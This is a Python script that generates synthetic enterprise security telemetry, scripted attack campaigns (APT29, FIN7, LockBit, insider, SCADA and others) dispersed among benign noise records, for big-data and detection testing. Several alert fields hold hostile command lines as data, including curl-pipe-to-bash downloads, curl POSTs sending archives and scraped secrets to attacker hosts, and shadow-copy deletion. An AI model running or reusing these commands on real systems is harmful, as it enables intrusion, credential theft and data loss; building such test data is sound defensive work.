"""
ThreatLens Enterprise Big-Data Telemetry Generator
Generates high-volume (100,000 to 1,000,000+ alerts) multi-source enterprise security telemetry
with realistic concurrent cyberattack campaigns and distributed operational noise.

Designed for Big-Data validation, Spark RDD stress-testing, and Kafka high-throughput streaming.
"""
import os
import sys
import json
import csv
import uuid
import random
import time
import argparse
from datetime import datetime, timedelta
from typing import List, Dict, Any

DATASETS_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "datasets"))
os.makedirs(DATASETS_DIR, exist_ok=True)

CSV_FIELDNAMES = [
    "id", "timestamp", "source", "alert_type", "severity",
    "source_ip", "destination_ip", "source_user", "host",
    "process", "file_hash", "domain", "detection_rule",
    "raw_message", "mitre_technique_id", "mitre_technique_name",
    "mitre_tactic", "confidence", "is_anomalous", "anomaly_reasons"
]


def build_attack_campaigns(base_time: datetime) -> List[Dict[str, Any]]:
    """Defines 5 ground-truth cyberattack campaigns to seed across the dataset."""
    campaign_records = []

    # Campaign 1: APT29 / Midnight Blizzard (State-Sponsored LSASS & DC Pivot)
    apt29_stages = [
        ("EDR", "Spearphishing Attachment", "HIGH", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "outlook.exe -> excel.exe", "Spearphishing macro opened in Outlook invoking hidden cmd", "update-sync-telemetry.org", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "T1566.001", "Spearphishing Attachment", "Initial Access"),
        ("Windows Event Logs", "PowerShell Execution", "HIGH", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "Encoded command line invocation retrieving stage-2 payload", "update-sync-telemetry.org", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "T1059.001", "PowerShell Execution", "Execution"),
        ("Authentication Systems", "Valid Accounts", "MEDIUM", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "svchost.exe", "OAuth token replay detected originating from untrusted autonomous system", "", "", "T1078", "Valid Accounts", "Defense Evasion"),
        ("EDR", "OS Credential Dumping: LSASS Memory", "CRITICAL", "EXEC-LAPTOP-CEO", "10.0.5.88", "198.51.100.22", "ceo_m_vance", "mimikatz.exe", "ReadProcessMemory handle open against LSASS.exe by unsigned binary", "", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "T1003.001", "LSASS Memory Dumping", "Credential Access"),
        ("Firewall", "Remote Services: SMB Shares", "HIGH", "CORP-DC-01", "10.0.1.10", "10.0.5.88", "ceo_m_vance", "net.exe use \\\\CORP-DC-01\\C$", "Traffic match: TCP/445 high-frequency IPC$ administrative query", "", "", "T1021.002", "SMB Remote Services", "Lateral Movement"),
        ("Windows Event Logs", "Active Directory Persistence", "CRITICAL", "CORP-DC-01", "10.0.1.10", "10.0.5.88", "SYSTEM", "ntdsutil.exe", "Shadow copy mount of ntds.dit database for offline cracking", "", "", "T1003.003", "NTDS.dit Extraction", "Credential Access")
    ]
    for s_idx, s in enumerate(apt29_stages):
        t = (base_time + timedelta(minutes=s_idx * 12)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-apt29-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"APT29 Heuristic Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.95,
            "is_anomalous": True, "anomaly_reasons": ["Unsigned binary accessing LSASS", "Cross-zone domain controller traversal"]
        })

    # Campaign 2: FIN7 E-Commerce SQLi & Massive Exfiltration
    fin7_stages = [
        ("Application Logs", "Exploit Public-Facing Application", "HIGH", "PROD-PAYMENT-API", "10.0.2.50", "203.0.113.88", "www-data", "nginx -> node.js", "SQL injection pattern UNION SELECT detected on payment processing endpoint /v2/checkout", "", "", "T1190", "Exploit Public-Facing Application", "Initial Access"),
        ("Linux Logs", "Command and Scripting Interpreter", "HIGH", "PROD-PAYMENT-API", "10.0.2.50", "203.0.113.88", "www-data", "/bin/sh -c 'curl -s http://203.0.113.88/stage2.sh | bash'", "Remote code execution spawned reverse shell via web application worker", "", "9f83c68d712030d979601d51a65492193e28e6a27e0258285514f76f490050a9", "T1059.004", "Unix Shell Execution", "Execution"),
        ("Database Logs", "Automated SQL Reconnaissance", "MEDIUM", "PROD-DB-PRIMARY", "10.0.2.51", "10.0.2.50", "db_app_user", "psql", "High-frequency schema enumeration querying pg_tables and customer_card_vault", "", "", "T1087.002", "Domain/DB Account Discovery", "Discovery"),
        ("EDR", "Archive Collected Data", "HIGH", "PROD-PAYMENT-API", "10.0.2.50", "203.0.113.88", "www-data", "tar -czf /tmp/vault_dump.tar.gz /var/lib/data/vault", "Archive creation containing sensitive financial database tables", "", "8a12b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2", "T1560.001", "Archive via Utility", "Collection"),
        ("Network Monitoring", "Exfiltration Over C2 Channel", "CRITICAL", "PROD-PAYMENT-API", "10.0.2.50", "203.0.113.88", "www-data", "curl -X POST -F 'data=@/tmp/vault_dump.tar.gz' http://203.0.113.88/drop", "Volumetric data transfer: 4.2 GB exfiltrated to suspicious foreign IP within 9 minutes", "c2-payment-vault-gateway.cc", "", "T1041", "Exfiltration Over C2", "Exfiltration")
    ]
    for s_idx, s in enumerate(fin7_stages):
        t = (base_time + timedelta(minutes=10 + s_idx * 14)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-fin7-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"FIN7 Detection: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.96,
            "is_anomalous": True, "anomaly_reasons": ["Unusual outbound volume > 4GB", "Web server spawning bash child"]
        })

    # Campaign 3: LockBit 3.0 Ransomware Outbreak
    ransom_stages = [
        ("EDR", "Supply Chain Compromise", "HIGH", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "node.exe / npm install malicious-auth-helper", "Compromised npm dependency downloaded unauthorized pre-install binary", "npm-registry-mirror-fake.net", "7a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b", "T1195.002", "Software Supply Chain Compromise", "Initial Access"),
        ("EDR", "Inhibit System Recovery: Volume Shadow Deletion", "CRITICAL", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "vssadmin.exe delete shadows /all /quiet", "Attempt to delete Volume Shadow Copies to prevent ransomware recovery", "", "", "T1490", "Inhibit System Recovery", "Impact"),
        ("Windows Event Logs", "Data Encrypted for Impact", "CRITICAL", "DEV-WORKSTATION-12", "10.0.5.110", "194.26.29.112", "dev_alex", "lockbit_encryptor.exe", "Mass file rename event: 12,400 files encrypted with .lockbit extension", "", "4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e", "T1486", "Data Encrypted for Impact", "Impact"),
        ("Firewall", "Network Service Scanning & Lateral SMB Spray", "HIGH", "DEV-WORKSTATION-12", "10.0.5.0/24", "10.0.5.110", "dev_alex", "lockbit_encryptor.exe", "High-frequency TCP/445 SYN sweep across corporate workstation subnet 10.0.5.0/24", "", "", "T1046", "Network Service Scanning", "Discovery")
    ]
    for s_idx, s in enumerate(ransom_stages):
        t = (base_time + timedelta(minutes=25 + s_idx * 8)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-ransom-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"Ransomware Behavioral Heuristic: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.98,
            "is_anomalous": True, "anomaly_reasons": ["Shadow copy deletion command detected", "High velocity file entropy transformation"]
        })

    # Campaign 4: Rogue Cloud Admin Tor Exfiltration
    cloud_stages = [
        ("Authentication Systems", "Unusual Geolocation Cloud Login", "HIGH", "AWS-IAM-ADMIN", "10.0.1.5", "185.220.101.5", "admin_backup_cloud", "browser_session", "Root console login detected from known Tor Exit Node 185.220.101.5", "", "", "T1078.004", "Cloud Accounts", "Defense Evasion"),
        ("Cloud Logs", "Cloud Infrastructure Discovery", "MEDIUM", "AWS-IAM-ADMIN", "10.0.1.5", "185.220.101.5", "admin_backup_cloud", "aws-cli/2.0", "AssumeRole invoked for role/EnterpriseFullAdmin from Tor session", "", "", "T1580", "Cloud Infrastructure Discovery", "Discovery"),
        ("Cloud Logs", "Data Staging in S3 Bucket", "HIGH", "AWS-S3-CORE", "10.0.1.5", "185.220.101.5", "admin_backup_cloud", "aws-cli/2.0", "Mass PutObject and bucket replication policy altered to external account 992817291029", "", "", "T1537", "Transfer Data to Cloud Account", "Exfiltration")
    ]
    for s_idx, s in enumerate(cloud_stages):
        t = (base_time + timedelta(minutes=45 + s_idx * 15)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-cloud-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"Cloud Threat Intel Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.94,
            "is_anomalous": True, "anomaly_reasons": ["Tor exit node authentication", "Cross-account IAM policy alteration"]
        })

    # Campaign 5: Novel Zero-Day Privilege Escalation & Masquerading
    zero_day_stages = [
        ("EDR", "Masquerading: Match Legitimate Name", "HIGH", "FIN-BILLING-03", "10.0.5.42", "10.0.5.42", "local_clerk", "C:\\Users\\local_clerk\\AppData\\Local\\Temp\\svchost_update.exe", "Executable named svchost_update running out of user AppData directory", "", "3b8a1c9d2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b", "T1036.005", "Match Legitimate Name or Location", "Defense Evasion"),
        ("EDR", "Exploitation for Privilege Escalation", "CRITICAL", "FIN-BILLING-03", "10.0.5.42", "10.0.5.42", "local_clerk", "svchost_update.exe -> SYSTEM token theft", "Unknown named pipe exploitation resulting in unexpected SYSTEM integrity token acquisition", "", "3b8a1c9d2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b", "T1068", "Exploitation for Privilege Escalation", "Privilege Escalation")
    ]
    for s_idx, s in enumerate(zero_day_stages):
        t = (base_time + timedelta(minutes=60 + s_idx * 20)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-zeroday-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"Behavioral Anomaly Engine: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.92,
            "is_anomalous": True, "anomaly_reasons": ["Unseen executable binary hash", "Parent-child hierarchy deviation in Temp folder"]
        })

    # Campaign 6: Active Directory Kerberoasting & SPN Hash Harvesting
    kerberoast_stages = [
        ("Authentication Systems", "Kerberoasting: Service Ticket Request", "HIGH", "CORP-DC-02", "10.0.1.11", "10.0.5.95", "j_martinez", "lsass.exe", "Kerberos TGS-REQ requested with RC4-HMAC encryption for SPN MSSQLSvc/CORP-DB", "", "", "T1558.003", "Kerberoasting", "Credential Access"),
        ("EDR", "PowerShell Execution", "HIGH", "DEV-WORKSTATION-04", "10.0.5.95", "10.0.5.95", "j_martinez", "powershell.exe -ep bypass Invoke-Kerberoast", "PowerShell command execution invoking automated SPN hash harvesting script", "", "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b", "T1059.001", "PowerShell", "Execution"),
        ("Windows Event Logs", "Logon Script / Pass-the-Ticket Logon", "CRITICAL", "CORP-DC-02", "10.0.1.11", "10.0.5.95", "Administrator", "lsass.exe", "Event 4624 Type 9: Domain admin session established via forged Kerberos ticket", "", "", "T1550.002", "Pass the Ticket", "Lateral Movement")
    ]
    for s_idx, s in enumerate(kerberoast_stages):
        t = (base_time + timedelta(minutes=30 + s_idx * 16)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-kerb-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"AD Threat Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.94,
            "is_anomalous": True, "anomaly_reasons": ["Unusual RC4 Kerberos ticket request", "Domain Administrator logon from non-admin subnet"]
        })

    # Campaign 7: Supply Chain CI/CD Runner Poisoning & Secret Harvesting
    cicd_stages = [
        ("Linux Logs", "Container Base Image Tampering", "HIGH", "DEV-SRV-TEST", "10.0.4.101", "45.33.32.156", "gitlab_runner", "dockerd -> container-entrypoint.sh", "GitLab runner pulling unsigned container image from untrusted registry", "registry-internal-mirror.xyz", "5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d", "T1195.002", "Supply Chain Compromise", "Initial Access"),
        ("EDR", "Credentials in Files / Environment Variable Theft", "CRITICAL", "DEV-SRV-TEST", "10.0.4.101", "45.33.32.156", "gitlab_runner", "env | grep -E 'AWS|TOKEN|SECRET' > /tmp/creds.txt", "Automated secret scraping script capturing production deployment tokens", "", "1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e", "T1552.001", "Credentials in Files", "Credential Access"),
        ("Network Monitoring", "Data Exfiltration to Webhook", "HIGH", "DEV-SRV-TEST", "10.0.4.101", "45.33.32.156", "gitlab_runner", "curl -X POST -d @/tmp/creds.txt https://webhook-drop-exfil.biz/receiver", "Outbound HTTPS telemetry containing high-entropy AWS secret keys transmitted", "webhook-drop-exfil.biz", "", "T1048.003", "Exfiltration Over Unencrypted/Alternative Protocol", "Exfiltration")
    ]
    for s_idx, s in enumerate(cicd_stages):
        t = (base_time + timedelta(minutes=50 + s_idx * 12)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-cicd-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"CI/CD Pipeline Security Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.93,
            "is_anomalous": True, "anomaly_reasons": ["Non-standard outbound egress from build cluster", "Environment secrets accessed in build step"]
        })

    # Campaign 8: Low-and-Slow Insider HR Data Staging & Exfiltration
    insider_stages = [
        ("Application Logs", "Mass HR Employee Database Export", "HIGH", "HR-TERMINAL-01", "10.0.5.115", "10.0.5.115", "hr_director_s_cole", "workday_client.exe", "Off-hours bulk CSV export of all executive salaries and SSNs (48,000 records)", "", "", "T1005", "Data from Local System", "Collection"),
        ("EDR", "Archive via Utility with Password Protection", "HIGH", "HR-TERMINAL-01", "10.0.5.115", "10.0.5.115", "hr_director_s_cole", "7z.exe a -pEncryptedLedger2026! C:\\Temp\\hr_vault.7z C:\\Users\\hr\\Exports\\*", "Password-protected 7z archive created to evade standard DLP content filters", "", "4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b", "T1560.001", "Archive via Utility", "Collection"),
        ("Network Monitoring", "Exfiltration to Cloud Storage", "HIGH", "HR-TERMINAL-01", "10.0.5.115", "10.0.5.115", "hr_director_s_cole", "chrome.exe", "Multi-megabyte POST upload to personal unapproved storage sync-vault-personal.io", "sync-vault-personal.io", "", "T1567.002", "Exfiltration to Cloud Storage", "Exfiltration")
    ]
    for s_idx, s in enumerate(insider_stages):
        t = (base_time + timedelta(minutes=70 + s_idx * 15)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-insider-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"Insider Governance Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.91,
            "is_anomalous": True, "anomaly_reasons": ["Unusual off-hours bulk database export", "Encrypted archive upload to personal storage"]
        })

    # Campaign 9: Critical Infrastructure SCADA / IoT Modbus PLC Tampering
    scada_stages = [
        ("Network Monitoring", "ICS Modbus Unauthorized Function Code", "CRITICAL", "DC-HVAC-PLC-01", "10.0.8.12", "192.168.99.44", "ot_gateway_service", "modbus_poll.elf", "Modbus TCP Function Code 16 (Write Multiple Holding Registers) from unauthorized IP", "", "", "T0855", "Unauthorized Command Message", "Execution"),
        ("Linux Logs", "Datacenter Chiller Setpoint Tampering", "CRITICAL", "DC-HVAC-PLC-01", "10.0.8.12", "192.168.99.44", "ot_gateway_service", "chiller_controller", "Emergency cooling loop override requested raising chiller temperature threshold to +45°C", "", "", "T0831", "Manipulation of Control", "Impact")
    ]
    for s_idx, s in enumerate(scada_stages):
        t = (base_time + timedelta(minutes=85 + s_idx * 18)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-scada-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"Industrial OT Sensor Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.97,
            "is_anomalous": True, "anomaly_reasons": ["Modbus register write from unapproved subnet", "Critical datacenter thermal setpoint modification"]
        })

    # Campaign 10: Perimeter Gateway Credential Stuffing & Account Takeover
    stuffing_stages = [
        ("Firewall", "Perimeter Credential Stuffing Burst", "HIGH", "PAYMENT-GW-01", "10.0.3.15", "103.251.167.22", "anonymous_botnet", "haproxy", "Volumetric login surge: 840 failed POST /api/auth/login attempts within 60 seconds", "", "", "T1110.004", "Credential Stuffing", "Credential Access"),
        ("Application Logs", "Multi-Account Password Spray Validation", "HIGH", "PAYMENT-GW-01", "10.0.3.15", "103.251.167.22", "sec_guard", "node_auth_cluster", "Brute-force hit against enterprise customer accounts with rotated user-agents", "", "", "T1110.003", "Password Spraying", "Credential Access"),
        ("Authentication Systems", "Account Takeover & MFA Reset Bypass", "CRITICAL", "PAYMENT-GW-01", "10.0.3.15", "103.251.167.22", "vip_customer_walsh", "node_auth_cluster", "Successful password validation immediately followed by unauthorized MFA recovery token generation", "", "", "T1078", "Valid Accounts", "Persistence")
    ]
    for s_idx, s in enumerate(stuffing_stages):
        t = (base_time + timedelta(minutes=100 + s_idx * 10)).isoformat() + "Z"
        campaign_records.append({
            "id": f"alt-stuff-bigdata-{s_idx:03d}-{uuid.uuid4().hex[:6]}",
            "timestamp": t, "source": s[0], "alert_type": s[1], "severity": s[2],
            "host": s[3], "destination_ip": s[4], "source_ip": s[5], "source_user": s[6],
            "process": s[7], "detection_rule": f"Edge Gateway Security Rule: {s[1]}", "raw_message": s[8],
            "domain": s[9], "file_hash": s[10], "mitre_technique_id": s[11],
            "mitre_technique_name": s[12], "mitre_tactic": s[13], "confidence": 0.95,
            "is_anomalous": True, "anomaly_reasons": ["Automated credential stuffing fingerprint", "Immediate MFA factor reset post-logon"]
        })

    return campaign_records


def generate_high_volume_dataset(total_records: int, output_json: str, output_csv: str):
    """
    Generates total_records (e.g. 100,000 or 1,000,000) security logs.
    Streams directly to disk to maintain minimal RAM overhead.
    """
    print(f"[ThreatLens Big Data Generator] Initializing generation of {total_records:,} records...")
    start_time = time.time()
    base_time = datetime.utcnow() - timedelta(hours=4)

    # Pre-generate ground-truth attacks
    attack_records = build_attack_campaigns(base_time)
    num_attacks = len(attack_records)
    print(f"[*] Prepared {num_attacks} high-fidelity attack alerts across 10 simultaneous campaigns.")

    # High-volume background noise templates
    noise_templates = [
        ("Windows Event Logs", "Scheduled Task Execution", "LOW", "CORP-DC-02", "svc_backup", "C:\\Windows\\System32\\wbadmin.exe", "Scheduled System State Archival (Event 4688)", "Routine scheduled differential backup completed successfully on cluster volume", "10.0.1.11", "10.0.2.51"),
        ("Firewall", "Internal Traffic Permitted", "LOW", "PROD-DB-PRIMARY", "app_cluster_node", "postgres.exe", "Authorized Internal Database Sync", "TCP port 5432 session established between authorized internal replica and primary", "10.0.2.51", "10.0.2.50"),
        ("EDR", "IT Inventory Agent Telemetry", "LOW", "HR-TERMINAL-01", "system", "C:\\Program Files\\Tanium\\TaniumClient.exe", "Endpoint Asset Inventory Telemetry Query", "Periodic hardware sensor telemetry query collected for asset management database", "10.0.5.20", "10.0.1.10"),
        ("Authentication Systems", "Kerberos Ticket Granting Request", "LOW", "CORP-DC-01", "m_torres", "lsass.exe", "Normal TGT Ticket Renewal (Event 4768)", "Kerberos TGS renewal granted for corporate workstation login ticket within standard lease window", "10.0.5.95", "10.0.1.10"),
        ("Network Monitoring", "DNS Query Resolution", "LOW", "DEV-WORKSTATION-12", "dev_alex", "chrome.exe", "Standard Cloud Service DNS Resolution", "Standard DNS resolution for outlook.office365.com returned authorized Microsoft IP", "10.0.5.110", "10.0.1.1"),
        ("Firewall", "Repetitive External Port Scan Drop", "LOW", "FIREWALL-EDGE-01", "anonymous", "kernel-drop", "Firewall Default Deny Rule", "Inbound TCP SYN packet dropped from external untrusted internet address on closed port", "198.51.100.180", "10.0.1.1"),
        ("Linux Logs", "Cron Job Execution", "LOW", "PROD-PAYMENT-API", "root", "/usr/sbin/cron", "Scheduled Cron Task (syslog)", "Routine logrotate and NTP synchronization cron job executed cleanly", "10.0.2.50", "10.0.2.50"),
        ("Cloud Logs", "CloudWatch Metric Reporting", "LOW", "AWS-INFRA-MON", "aws-agent", "amazon-cloudwatch-agent", "CloudWatch Normal Ingestion", "Standard EC2 system performance and IOPS metrics collected", "10.0.1.5", "10.0.1.5")
    ]

    # Pre-select insertion slots for attack records so they are dispersed throughout the stream
    attack_slots = set(random.sample(range(0, total_records), num_attacks))
    attack_iter = iter(attack_records)

    # Open CSV and JSON streaming file handles
    csv_file = open(output_csv, "w", newline="", encoding="utf-8")
    csv_writer = csv.DictWriter(csv_file, fieldnames=CSV_FIELDNAMES)
    csv_writer.writeheader()

    json_file = open(output_json, "w", encoding="utf-8")
    json_file.write("[\n")

    first_json = True
    report_step = total_records // 10 if total_records >= 100000 else 25000

    for idx in range(total_records):
        if idx in attack_slots:
            rec = next(attack_iter)
        else:
            pat = noise_templates[idx % len(noise_templates)]
            # Distribute time smoothly across 4 hours
            offset_seconds = int((idx / total_records) * 14400) + random.randint(0, 30)
            t = (base_time + timedelta(seconds=offset_seconds)).isoformat() + "Z"
            # Randomize IP host slightly to create realistic enterprise clustering
            host_num = (idx % 40) + 1
            rec = {
                "id": f"alt-noise-{idx:07d}",
                "timestamp": t,
                "source": pat[0],
                "alert_type": pat[1],
                "severity": pat[2],
                "source_ip": pat[8],
                "destination_ip": pat[9],
                "source_user": pat[4],
                "host": f"{pat[3].split('-')[0]}-SRV-{host_num:02d}",
                "process": pat[5],
                "file_hash": "",
                "domain": "",
                "detection_rule": pat[6],
                "raw_message": pat[7],
                "mitre_technique_id": "",
                "mitre_technique_name": "",
                "mitre_tactic": "",
                "confidence": 0.70,
                "is_anomalous": False,
                "anomaly_reasons": []
            }

        # Write CSV row
        csv_row = dict(rec)
        csv_row["anomaly_reasons"] = ";".join(rec["anomaly_reasons"]) if isinstance(rec["anomaly_reasons"], list) else ""
        csv_writer.writerow(csv_row)

        # Write JSON element (compact: omit empty string / list fields to keep under 40MB)
        if not first_json:
            json_file.write(",\n")
        else:
            first_json = False
        compact_rec = {k: v for k, v in rec.items() if v not in ("", [], None)}
        json_file.write(json.dumps(compact_rec, separators=(',', ':')))

        if (idx + 1) % report_step == 0 or idx == total_records - 1:
            elapsed = time.time() - start_time
            rate = (idx + 1) / max(0.001, elapsed)
            print(f"  -> Generated {idx + 1:,} / {total_records:,} records ({rate:,.0f} records/sec)")

    json_file.write("\n]\n")
    csv_file.close()
    json_file.close()

    total_time = time.time() - start_time
    json_size_mb = os.path.getsize(output_json) / (1024 * 1024)
    csv_size_mb = os.path.getsize(output_csv) / (1024 * 1024)

    print(f"\n[ThreatLens Big Data Generator Complete]")
    print(f"[*] Total Records: {total_records:,}")
    print(f"[*] Elapsed Time: {total_time:.2f} seconds ({total_records/total_time:,.0f} records/sec)")
    print(f"[*] JSON File: {output_json} ({json_size_mb:.2f} MB)")
    print(f"[*] CSV File:  {output_csv} ({csv_size_mb:.2f} MB)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate ThreatLens Big-Data Telemetry")
    parser.add_argument("--count", type=int, default=100000, help="Number of records (default: 100,000)")
    parser.add_argument("--prefix", type=str, default="bigdata_100k", help="Filename prefix")
    args = parser.parse_args()

    count = args.count
    prefix = args.prefix if args.prefix != "bigdata_100k" else ("bigdata_1M" if count >= 1000000 else "bigdata_100k")
    
    out_json = os.path.join(DATASETS_DIR, f"{prefix}_enterprise_multi_attack.json")
    out_csv = os.path.join(DATASETS_DIR, f"{prefix}_enterprise_multi_attack.csv")

    generate_high_volume_dataset(count, out_json, out_csv)
